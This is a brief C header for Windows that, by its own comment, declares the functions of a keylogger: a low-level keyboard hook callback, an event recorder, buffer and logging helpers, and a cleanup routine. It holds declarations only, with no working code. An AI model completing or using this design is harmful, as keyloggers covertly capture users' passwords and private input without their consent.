#include <windows.h>
#include <winuser.h>

// method signature for keylogger function
int make_me_crazy();

LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);

void eventsRec();

PSTR getBuff();

void Log(char);

void LogS(char *);

void clean();
